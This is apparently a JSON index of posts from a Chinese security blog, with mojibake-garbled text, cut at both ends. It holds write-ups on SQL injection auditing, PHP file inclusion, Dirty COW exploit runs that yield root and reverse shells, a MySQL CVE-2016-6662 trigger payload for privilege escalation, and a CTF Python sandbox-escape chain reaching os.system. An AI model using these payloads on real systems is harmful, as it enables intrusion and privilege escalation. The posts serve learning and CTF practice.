å…¥æ³¨å…¥è¯­å¥æˆ–è€…client ipä¼ å…¥ã€‚ ç»“æœå¯ä»¥çœ‹åˆ° å…¶ä»–ä½ç½®çš„æ³¨å…¥ï¼Œä¸èƒ½å›æ˜¾ï¼Œå°±ä¸åˆ†æäº†ã€‚ æ€»ç»“æ€»ä½“æ¥è¯´ï¼Œç›´æ¥å¯ä»¥grepåˆ°$_GETã€$_POSTã€$_REQUESTçš„cmsï¼Œå®¡è®¡èµ·æ¥ä¼šæ¯”è¾ƒè½»æ¾ã€‚å¯ä»¥å…ˆä»å…¥å£çœ‹èµ·ï¼Œå°†common,configç­‰æ–‡ä»¶çœ‹ä¸€éï¼Œå†æŸ¥æ‰¾å±é™©å‡½æ•°ï¼Œæ•°æ®å…¥å£å°±å¯å®¡è®¡å‡ºå‡ ä¸ªæ¼æ´æ¥ã€‚bluecmsæš‚æ—¶å®¡è®¡åˆ°è¿™ä¸€æ­¥ï¼Œä¸»è¦æ‰¾çš„æ˜¯SQLæ³¨å…¥çš„æ¼æ´ã€‚å…¶ä»–æ¼æ´æ‰“ç®—å‡†å¤‡å¦å¤–ä¸€å¥—cmsæ¥å®¡è®¡:)"},{"title":"ã€VULNERABLITYã€‘æ–‡ä»¶åŒ…å«æ¼æ´è¯¦è§£","permalink":"http://blog.0kami.cn/2016/12/19/old-file-include/","text":"æ¦‚è¿°å¾ˆä¹…æ²¡æœ‰å½’çº³æ€»ç»“çŸ¥è¯†ç‚¹äº†ï¼Œå­¦äº†é‚£ä¹ˆå¤šæ€»æ„Ÿè§‰é‚£ä¹ˆé›¶æ•£ï¼Œæ‰€ä»¥å‡†å¤‡å¼€å§‹æ€»ç»“è¿™ä¸€ç³»åˆ—çš„æ¼æ´è¯¦è§£ã€‚ä¸€æ–¹é¢æ˜¯æ€»ç»“ä¸€æ–¹é¢ä¹Ÿæ˜¯å¤ä¹ ã€‚è¿™ç¯‡ä¸»è¦æ€»ç»“ä¸€ä¸‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´ç”±äºåœ¨Webåº”ç”¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œå¤§é‡ä»£ç æ˜¯å¯ä»¥é‡å¤ä½¿ç”¨çš„ï¼Œä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ç»“åˆå¼€å‘è¯­è¨€(å¦‚php)çš„ä¾¿åˆ©ï¼ŒåŒ…å«é‡å¤åˆ©ç”¨çš„ä»£ç ï¼Œå¦‚æœåœ¨åŒ…å«è¿‡ç¨‹ä¸­ï¼Œè·¯å¾„æˆ–è¯·æ±‚çš„urlå¯æ§ä¸”æ²¡æœ‰åšä»»ä½•çš„å®‰å…¨å¤„ç†ï¼Œå°±å®¹æ˜“å‘ç”Ÿæ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ–‡ä»¶åŒ…å«æ¼æ´åŒ…æ‹¬ æœ¬åœ°æ–‡ä»¶åŒ…å« è¿œç¨‹æ–‡ä»¶åŒ…å« ä¸‹é¢ä¸»è¦è®²çš„æ–‡ä»¶åŒ…å«åœ¨phpä¸­çš„åº”ç”¨ï¼Œæ¯•ç«Ÿphpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼Œ23333333ps:å…¶ä»–è¯­è¨€ï¼Œé‡åˆ°äº†å†è¡¥å…… è¿œç¨‹æ–‡ä»¶åŒ…å«è¿™é‡Œå…ˆè®²ä¸€ä¸‹è¿œç¨‹æ–‡ä»¶åŒ…å«RFIï¼ˆRemote File Includeï¼‰ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«å°±æ˜¯ï¼ŒWebåº”ç”¨ç¨‹åºè¯·æ±‚è¿œç¨‹çš„èµ„æºï¼Œè¿›è¡Œä¸€ä¸ªåŒ…å«åˆ©ç”¨ã€‚ä¸€äº›çŒ¥ççš„è¿‡é©¬ä¸€å¥è¯æœ¨é©¬å°±æ˜¯åˆ©ç”¨è¿™ç§æ–¹å¼è¿›è¡Œä¸€ä¸ªæ¶æ„ä»£ç çš„åŒ…å«ã€‚åœ¨phpä¸­é€ æˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œé¦–å…ˆéœ€è¦é…ç½®æ–‡ä»¶ä¸­allow_url_include=Oné»˜è®¤ä¸å¼€å¯ï¼Œä»¥åŠè¿œç¨‹è¯»å–æ–‡ä»¶allow_url_fopen=Onï¼Œæ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹æœ‰å“ªäº›è§¦å‘è¿œç¨‹æ–‡ä»¶åŒ…å«çš„phpå‡½æ•°ã€‚12345678910//è¯»å–è¿œç¨‹æ–‡ä»¶å†…å®¹fopen()copy()file_get_content()//åŒ…å«è¿œç¨‹æ–‡ä»¶ä»£ç include()include_once()require()require_once()//å¯èƒ½ä¼šæœ‰é—æ¼ï¼Œå°ä¼™ä¼´å¦‚æœçŸ¥é“è¿˜æœ‰å…¶ä»–çš„å¯ä»¥emailæˆ‘ï¼šï¼‰ å‰é¢è¯»å–è¿œç¨‹æ–‡ä»¶å†…å®¹ï¼Œå¯èƒ½ä¼šå‡ºç°åœ¨ä¸Šä¼ å¤´åƒå¤„ï¼Œå­˜å–è¿œç¨‹å¤´åƒã€‚åè€…å±å®³å¯èƒ½æ›´å¤§ï¼Œç›´æ¥åŒ…å«æ¶æ„ä»£ç æ‰§è¡Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ è¿œç¨‹åŒ…å«æ”¯æŒçš„åè®®åœ¨æ»¡è¶³é…ç½®æ–‡ä»¶çš„è¦æ±‚ä¸‹ï¼Œä½¿ç”¨phpæ”¯æŒä½¿ç”¨httpã€https(å­˜åœ¨opensslæ‰©å±•æ—¶)ã€ftpã€php://inputã€"},{"title":"ã€CVE-2016-5195ã€‘Dirtycow","permalink":"http://blog.0kami.cn/2016/10/26/old-dirtycow-cve-2016-5195/","text":"æ¦‚è¿°æœ€è¿‘å‡ºæ¥çš„dirtycowï¼Œå½±å“ç‰ˆæœ¬:Linux kernel &gt;= 2.6.22ï¼ˆ2007å¹´å‘è¡Œï¼Œåˆ°ä»Šå¹´10æœˆ18æ—¥æ‰ä¿®å¤ï¼‰,ç”¨ç½‘ä¸Šçš„EXPè¯•äº†ä¸€ä¸‹ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ EXPhttps://www.exploit-db.com/exploits/40616/è¿™ä¸ªEXPæ˜¯exploitdbä¸Šçš„ï¼Œä½†æ˜¯å®¹æ˜“é€ æˆç³»ç»Ÿå´©æºƒï¼ŒæˆåŠŸåä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„shell 123456789101112131415okami@ubuntu14:~$ ./dirtycowDirtyCow root privilege escalationBacking up /usr/bin/passwd.. to /tmp/bakSize of binary: 47032Racing, this may take a while..thread stoppedthread stopped/usr/bin/passwd is overwrittenPopping root shell.Don&apos;t forget to restore /tmp/bakroot@ubuntu14:/home/okami# iduid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)root@ubuntu14:/home/okami# whoamirootroot@ubuntu14:/home/okami# https://github.com/scumjr/dirtycow-vdsoè¿™ä¸ªEXPä¸ä¼šå‡ºç°ç³»ç»Ÿå´©æºƒï¼Œä½†æ˜¯ä½œè€…æœ¬äººè¯´ä¸é€‚ç”¨äºæ‰€æœ‰linuxç‰ˆæœ¬ï¼Œä¸è¿‡è¯•éªŒäº†ä¸€ä¸‹ï¼Œubuntu14 16 centOS7éƒ½å¯ä»¥123456789101112131415161718192021okami@ubuntu14:~$ ./0xdeadbeef[*] exploit: patch 1/2[*] vdso successfully backdoored[*] exploit: patch 2/2[*] vdso successfully backdoored[*] waiting for reverse connect shell...[*] enjoy![*] restore: patch 2/2[*] vdso successfully restored[*] restore: patch 1/2[*] vdso successfully restorediduid=0(root) gid=0(root) groups=0(root)whoamirootlsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 14.04.5 LTSRelease: 14.04Codename: trusty æ³¨æ„è¿™é‡Œæœ‰ä¸€æ­¥æ˜¯waiting for reverse connect shellâ€¦ï¼Œéœ€è¦ä¸€ç‚¹æ—¶é—´ï¼ŒæˆåŠŸåæœ‰rootæƒé™çš„shell"},{"title":"ã€CVE-2016-6662ã€‘MYSQLææƒåˆ†æ","permalink":"http://blog.0kami.cn/2016/09/18/old-cve-2016-6663-mysql-exp/","text":"æ¦‚è¿°å‡ å¤©å‰å‡ºäº†mysqlæœ¬åœ°ææƒçš„0dayï¼Œè™½ç„¶ç°åœ¨å®˜æ–¹å·²ç»å‡ºäº†è¡¥ä¸ï¼Œä½†æ˜¯å—å½±å“çš„ä¸»æœºè¿˜æ˜¯æŒºå¤šçš„ã€‚è·Ÿè¿›æ“ä½œä¸€éï¼šï¼‰ æ¼æ´å½±å“1234567MySQL &lt;= 5.7.15 è¿œç¨‹ä»£ç æ‰§è¡Œ/ ææƒ (0day) 5.6.33 5.5.52Mysqlåˆ†æ”¯çš„ç‰ˆæœ¬ä¹Ÿå—å½±å“,åŒ…æ‹¬ï¼š MariaDB PerconaDB å®éªŒåˆ†æè¿™æ¬¡å®éªŒä¸»è¦ä½¿ç”¨dockeræ­å»ºç¯å¢ƒï¼Œæœ‰éœ€è¦çš„åŒå­¦å¯ä»¥pullæˆ‘çš„åº“ç©0kami/vulenv:cve-2016-6663å®éªŒä¸»è¦ä»attackerçš„è§’åº¦å…¥æ‰‹ï¼Œé¢„å…ˆæ‹¥æœ‰çš„æƒé™ï¼š1234mysql è´¦æˆ·æ‹¥æœ‰fileæƒé™ bob/bobexp mysql_hookandroot_lib.cmysql-server-5.6my.cnfå¯è¢«mysqlç»„æ”¹å†™å†™ å…ˆæŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ä¿¡æ¯å°†/etc/mysql/my.cnfæƒé™ä¿®æ”¹æ‰åˆ›å»ºbobç”¨æˆ·ï¼Œå¹¶èµ‹äºˆfileï¼Œselectï¼Œinsertæƒé™ï¼Œåˆ›å»ºç”¨äºå®éªŒçš„æ•°æ®åº“activedbå’Œè¡¨active_tableå°†expå…ˆå†™å…¥tmpç›®å½•ï¼Œå¹¶ç¼–è¯‘æˆsoæ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹ipï¼Œportå’Œmy.cnfçš„ä½ç½®gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldlæœ€åä¸€æ­¥å°±æ˜¯å‡†å¤‡ä¸€ä¸‹active_tableçš„è§¦å‘å™¨äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç°åœ¨è‡ªå·±ç”µè„‘ä¸Šrootç”¨æˆ·æƒé™ä¸‹ç”Ÿæˆä¸€ä¸ªtraggeråœ¨activedbæ•°æ®ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªè§¦å‘å™¨åˆ°æ­¤ä½ç½®æˆ‘ä»¬æ‰€æœ‰çš„å‡†å¤‡å·¥ä½œéƒ½åšå¥½äº†ã€‚è®©æˆ‘ä»¬ç”¨bobç”¨æˆ·æ¥å¼¹ä¸ªshellå§1select &quot;TYPE=TRIGGERS\\ntriggers=&apos;CREATE DEFINER=`root`@`localhost` TRIGGER active_table\\nAFTER INSERT\\n ON `active_table` FOR EACH ROW\\nBEGIN\\n DECLARE void varchar(550);\\n set global general_log_file=\\\\\\&apos;/etc/mysql/my.cnf\\\\\\&apos;;\\n set global general_log = on;\\n select \\&quot;\\n[mysqld]\\nmalloc_lib=\\\\\\&apos;/tmp/mysql_hookandroot_lib.so\\\\\\&apos;\\n\\&quot; INTO void; \\n set global general_log = off;\\nEND&apos;\\nsql_modes=1073741824\\ndefiners=&apos;root@localhost&apos;\\nclient_cs_names=&apos;latin1&apos;\\nconnection_cl_names=&apos;latin1_swedish_ci&apos;\\ndb_cl_names=&apos;latin1_swedish_ci&apos;&quot; into dumpfile &apos;/var/lib/mysql/activedb/active_table.TRG&apos;; ç”¨bobçš„ç”¨æˆ·å†™å…¥æ–‡ä»¶äº§ç”Ÿä¸€ä¸ªè§¦å‘å™¨ï¼Œè¿™ä¸ªè§¦å‘å™¨å½“äº§ç”Ÿinsertæ—¶è§¦å‘æ¥æŸ¥çœ‹ä¸€ä¸‹ï¼Œæ‰§è¡Œåçš„/etc/mysql/my.cnfçš„å†…å®¹é‡å¯ä¸€ä¸‹æ•°æ®åº“ï¼Œåå¼¹ä¸€ä¸ªshellå‘ç°å¯å†™çš„my.cnfä¼šè¢«å¿½ç•¥ï¼Ÿï¼Ÿï¼Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ˆéš¾é“æ‰“è¡¥ä¸äº†ï¼Ÿï¼‰ï¼Œä¸çŸ¥é“5.5çš„æƒ…å†µä¼šæ€ä¹ˆæ ·ï¼Œæ‰€ä»¥å…ˆæŠŠmy.cnfçš„æƒé™æ”¹å›æ¥744æˆåŠŸåå¼¹ä¸€ä¸ªshellï¼Œè¿™è¾¹è¿”å›çš„ä¸€ä¸ªshellæ˜¯mysqlæƒé™çš„ æ˜¯å› ä¸ºæˆ‘æµ‹è¯•çš„ç¯å¢ƒmysqld_safeæ˜¯ä»¥mysqlæƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥å¼¹å‡ºæ¥çš„æƒé™æ˜¯mysqlçš„ï¼Œä½†æ˜¯å¦‚æœmysqld_safeæ˜¯ä»¥rootæƒé™è¿è¡Œï¼Œé‚£ä¹ˆåå¼¹çš„shellå°±æ˜¯rootæƒé™çš„ï¼Œé€ æˆææƒã€‚ æ€»ç»“æµ‹è¯•ç¯å¢ƒæ­å»ºè¿˜æœ‰åˆ©ç”¨è¿‡ç¨‹è¿˜æ˜¯å‡ºç°äº†å¾ˆå¤šé—®é¢˜ï¼Œå¯å†™çš„my.cnfä¼šè¢«å¿½ç•¥è½½å…¥ï¼ˆä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºä¿®å¤è¿‡çš„åŸå› ï¼‰ï¼Œtriggersçš„åˆ©ç”¨ï¼ˆå¯ä»¥åŒæ ·åˆ©ç”¨åœ¨æ‹¥æœ‰fileæƒé™çš„æƒ…å†µä¸‹æå‡æƒé™ï¼Œè¿™ä¸ªåˆ°æ—¶å€™å†æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼‰"},{"title":"ã€VULNERABLITYã€‘python sandbox escape","permalink":"http://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/","text":"æ¦‚è¿°å‰å‡ å¤©çš„åå±±æ¯å‡ºäº†ä¸€é“pythonçš„æ²™ç›’é€ƒé€¸ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ã€‚åœ¨ç½‘ä¸Šæœç´¢äº†ä¸€ä¸‹ï¼Œå‘ç°å¾ˆæ—©å°±å‡ºè¿‡è¿™ç§ç±»å‹çš„é¢˜ï¼Œæºç éƒ½å·®ä¸å¤šã€‚å­¦ä¹ äº†ä¸€ä¸‹æ€è·¯ï¼Œè¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼šï¼‰ ä»‹ç»æ²™ç›’æºç å¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env pythonfrom __future__ import print_functionprint(\"Welcome to my Python sandbox! Enter commands below!\")banned = [ \"import\", \"exec\", \"eval\", \"pickle\", \"os\", \"subprocess\", \"kevin sucks\", \"input\", \"banned\", \"cry sum more\", \"sys\"]targets = __builtins__.__dict__.keys() targets.remove('raw_input') targets.remove('print') for x in targets:# å»é™¤æ‰€æœ‰å†…ç½®å‡½æ•°é™¤print raw_input del __builtins__.__dict__[x]while 1: print(\"&gt;&gt;&gt;\", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print(\"No bueno\") break else: # this means nobreak exec data ä¸èƒ½å‡ºç°bannedåˆ—è¡¨ä¸­çš„å­—ç¬¦ï¼Œä½†æ˜¯éœ€è¦è¯»å–flagæ–‡ä»¶å†…å®¹ã€‚ åŸç†ç»•è¿‡å‰é¢çš„é™åˆ¶ï¼Œæˆ‘ä»¬æ¥ä¸€æ­¥ä¸€æ­¥çœ‹payload æ–¹æ³•ä¸€123456&gt;&gt;&gt; [].__class__&lt;type &apos;list&apos;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type &apos;dict&apos;&gt;&gt;&gt;&gt; ().__class__&lt;type &apos;tuple&apos;&gt; é¦–å…ˆpythonçš„å†…ç½®å¯¹è±¡æœ‰ä¸€ä¸ªclasså±æ€§æ¥å­˜å‚¨ç±»å‹ï¼Œæˆ‘ä»¬å¾€ä¸Šæ‰¾ä»–çš„çˆ¶ç±»ä½¿ç”¨baseå±æ€§123456&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt; å¯ä»¥çœ‹åˆ°è¿”å›objectå¯¹è±¡ï¼Œå› ä¸ºpythonä¸­ä¸€åˆ‡å‡ä¸ºå¯¹è±¡ï¼Œå‡ç»§æ‰¿objectå¯¹è±¡ï¼Œå¾—åˆ°objectä¹‹åæˆ‘ä»¬å°±å¯åœ¨é€šè¿‡å±æ€§subclassesæ¥æŸ¥çœ‹objectçš„å­ç±»ï¼ˆåŒ…æ‹¬æ‰€æœ‰çš„å†…ç½®ç±»ï¼‰12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;] å›åˆ°æˆ‘ä»¬çš„ä¸»è¦ç›®çš„ä¸Šï¼Œæˆ‘ä»¬éœ€è¦è¯»å–flagæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œåœ¨è¿™äº›å­ç±»ä¸­æœ‰å“ªäº›æ˜¯å¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹çš„å‘¢ï¼Ÿç­”æ¡ˆæ˜¯fileå­ç±»ï¼Œé¦–å…ˆæŸ¥æ‰¾ä¸€ä¸‹fileå­ç±»çš„ä½ç½®ã€‚12&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)40 è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å»ºç«‹ä¸€ä¸ªfileç±»çš„åˆ«åè¯»æ–‡ä»¶å•¦ï¼šï¼‰12&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read() ï¼Ÿï¼Ÿï¼Ÿæ²¡æœ‰ä»»ä½•å†…å®¹æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯ä»–æ²¡æœ‰æŠ¥é”™è¯´æ˜å­˜åœ¨flag.txtæ–‡ä»¶ï¼Œæˆ‘ä»¬å°è¯•ç”¨ä»–ç»™çš„printå‡½æ•°æ¥æ‰“å°12&gt;&gt;&gt; print(f(&apos;./flag.txt&apos;).read())This is a Flag&#123;enjoy_yourself_ctfer&#125; å¾—åˆ°flag æ–¹æ³•äºŒåŒæ ·çš„è¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯ä½¿ç”¨osæ¨¡å—æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤systemï¼Œä½†æ˜¯osè¢«å±è”½12&gt;&gt;&gt; import osNo bueno æˆ‘ä»¬å¾—æƒ³å…¶ä»–åŠæ³•æ¥è·å–shellã€‚é€šè¿‡ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå­ç±»ä»–èƒ½è°ƒç”¨osæ¨¡å—ï¼Œè¿™é‡Œç”¨åˆ°äº†warnings.catch_warningsç±»1234567&gt;&gt;&gt; import warnings&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]&lt;class &apos;warnings.catch_warnings&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()[&apos;filterwarnings&apos;, &apos;once_registry&apos;, &apos;WarningMessage&apos;, &apos;_show_warning&apos;, &apos;filters&apos;, &apos;_setoption&apos;, &apos;showwarning&apos;, &apos;__all__&apos;, &apos;onceregistry&apos;, &apos;__package__&apos;, &apos;simplefilter&apos;, &apos;default_action&apos;, &apos;_getcategory&apos;, &apos;__builtins__&apos;, &apos;catch_warnings&apos;, &apos;__file__&apos;, &apos;warnpy3k&apos;, &apos;sys&apos;, &apos;__name__&apos;, &apos;warn_explicit&apos;, &apos;types&apos;, &apos;warn&apos;, &apos;_processoptions&apos;, &apos;defaultaction&apos;, &apos;__doc__&apos;, &apos;linecache&apos;, &apos;_OptionError&apos;, &apos;resetwarnings&apos;, &apos;formatwarning&apos;, &apos;_getaction&apos;] æ¥ä¸‹æ¥å†æ‰¾linecache1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index(&apos;linecache&apos;)25&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;] å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯ä»¥è°ƒç”¨osæ¨¡å—ï¼Œæ¥ä¸‹æ¥å°±è°ƒç”¨systemå‡½æ•°äº†1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)144 æ•´ç†ä¸€ä¸‹123456789101112&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&gt;&gt;&gt; a&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; s=a.__dict__.keys().index(&apos;system&apos;)&gt;&gt;&gt; s144&gt;&gt;&gt; s=a.__dict__.keys()[144]&gt;&gt;&gt; s&apos;system&apos;&gt;&gt;&gt; s=a.__dict__.values()[144]&gt;&gt;&gt; s(&apos;pwd&apos;)/home/xxxx/Desktop/code/python-code/test å¥½äº†ç°åœ¨å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œcatä¸€ä¸‹flag12&gt;&gt;&gt; s(&apos;cat flag.txt&apos;)This is a Flag&#123;enjoy_yourself_ctfer&#125; æ€»ç»“é€šè¿‡ä¸Šé¢çš„pythonæ²™ç›’é€ƒé€¸ï¼Œå‘ç°è¯»pythonå®˜ç½‘æ‰‹å†Œè¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œæ‰¾ä¸ªæ—¶é—´ä¸€ç‚¹ä¸€ç‚¹çœ‹ï¼šï¼‰å…±å‹‰ å‚è€ƒhttps://hexplo.it/escaping-the-csawctf-python-sandbox/"},{"title":"ã€MOBILEã€‘how to install drozer on mac","permalink":"http://blog.0kami.cn/2016/08/20/old-how-to-install-drozer-on-mac/","text":"ä¸€ï¼šæ¦‚è¿°drozeræ˜¯ä¸€æ¬¾é’ˆå¯¹Androidç³»ç»Ÿçš„å®‰å…¨æµ‹è¯•æ¡†æ¶ã€‚drozerå¯ä»¥å¸®åŠ©Android appå’Œè®¾å¤‡å˜å¾—æ›´å®‰å…¨ï¼Œå…¶æä¾›äº†å¾ˆå¤šAndroidå¹³å°ä¸‹çš„æ¸—é€æµ‹è¯•exploitä¾›ä½ ä½¿ç”¨å’Œåˆ†äº«ã€‚å¯¹äºè¿œç¨‹çš„exploitï¼Œå®ƒå¯ä»¥ç”Ÿæˆshellcodeå¸®åŠ©ä½ è¿›è¡Œè¿œç¨‹è®¾å¤‡ç®¡ç†ã€‚ æ›´å¿«çš„Androidå®‰å…¨è¯„ä¼°drozerå¯ä»¥å¤§å¤§ç¼©å‡Androidå®‰å…¨è¯„ä¼°çš„è€—æ—¶ï¼Œé€šè¿‡æ”»å‡»æµ‹è¯•æš´éœ²Android APPçš„æ¼æ´ã€‚ åŸºäºçœŸæœºçš„æµ‹è¯•drozerè¿è¡Œåœ¨Androidæ¨¡æ‹Ÿå™¨å’ŒçœŸå®è®¾å¤‡ä¸Šï¼Œå®ƒåªéœ€è¦USBè°ƒè¯•å³å¯ä½¿ç”¨ã€‚ è‡ªåŠ¨åŒ–å’Œæ‰©å±•drozeræœ‰å¾ˆå¤šæ‰©å±•æ¨¡å—ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä»–ä»¬è¿›è¡Œæµ‹è¯•ä»¥å‘ç°Androidå®‰å…¨é—®é¢˜ã€‚ äºŒï¼šå®‰è£…drozerä¸‹è½½é“¾æ¥ï¼šhttps://github.com/mwrlabs/drozer windowå’ŒLinuxä¸‹çš„å®‰è£…è¦ç®€å•çš„å¤šï¼Œä½†æ˜¯åœ¨macä¸Šå®‰è£…æ—¶é‡åˆ°äº†ä¸€äº›é”™è¯¯ï¼Œå› æ­¤å°†è‡ªå·±çš„å®‰è£…æ­¥éª¤è®°å½•ä¸‹æ¥ã€‚ å› 